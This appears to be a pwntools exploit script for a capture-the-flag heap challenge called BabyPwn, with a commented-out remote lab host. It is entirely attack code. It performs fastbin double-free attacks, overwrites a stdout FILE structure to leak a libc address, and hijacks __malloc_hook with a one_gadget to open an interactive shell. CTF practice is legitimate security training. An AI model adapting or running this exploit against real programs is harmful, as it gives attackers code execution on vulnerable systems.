from pwn import *

def create(name,size,context):
    p.recvuntil('Input your choice:')
    p.sendline('1')
    p.sendafter(':',name)
    p.sendlineafter(':',str(size))
    p.sendafter(':',context)

def delete(index):
    p.recvuntil('Input your choice:')
    p.sendline('2')
    p.sendlineafter(':',str(index))

#malloc full chunk struct,control the struct
def exp():
    create('A',0x88,'A'*0x88)#0
    create('A',0x28,'A')#1
    delete(0)
    delete(1)
    create('A',0x68,'\xdd\xf5')#2
    create('A',0x68,'A')#3
    create('A',0x68,'A')#4
    delete(3)
    delete(4)
    delete(3)
    create('A',0x68,p64(0x60203d))#5
    create('A',0x68,'A')#6
    create('A',0x68,'A')#7
#    create('A',0x58,'A')#8
#    delete(8)
    create('A',0x68,'\x00'*0x8+p64(0x61)+'\x00'*0x58)#8


    create('A',0x68,'A')#0
    create('A',0x68,'A')#1
    create('A',0x58,'A')#2
    create('A',0x58,'A')#3
    delete(0)
    delete(1)
    delete(0)
    delete(2)
    delete(3)
    delete(2)             #  0x60205d
    create('A',0x68,'\x30\x70')#4
    create('A',0x68,'A')#5
    create('A',0x58,p64(0x60204d))#6
    create('A',0x58,'A')#7
    create('A',0x58,'A')#8
    create('A',0x58,'\x00'*0x58)#9

    create('A',0x68,'A')#0
    create('A',0x68,'A')#1
    create('A',0x68,'\x00'*51 + p64(0xfbad1800) + p64(0)*3 + '\x50')#2
    data = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = data - 3954339
    print '[*] libc base addr : '+hex(libc_base)

    delete(0)
    delete(1)
    delete(0)
    create('A',0x68,p64(libc_base+libc.symbols['__malloc_hook']-35))#3
    create('A',0x68,'A')#4
    create('A',0x68,'A')#5
    create('A',0x68,'\x00'*11+p64(libc_base+0xf1147)+p64(libc_base+542400+0x6))#6
    gdb.attach(p)
    p.sendlineafter(':','1')
    

if __name__ == '__main__' :
    flag = 1
    while flag :
        p = process('./BabyPwn')
        #p = remote('90b826377a05d5e9508314e76f2f1e4e.kr-lab.com',40001)
        elf = ELF('./BabyPwn')
        libc = ELF('./libc.so')
#        context.log_level = 'debug'
        try :
            exp()
        except Exception,e :
            p.close()
        else :
            flag = 0
    p.interactive()
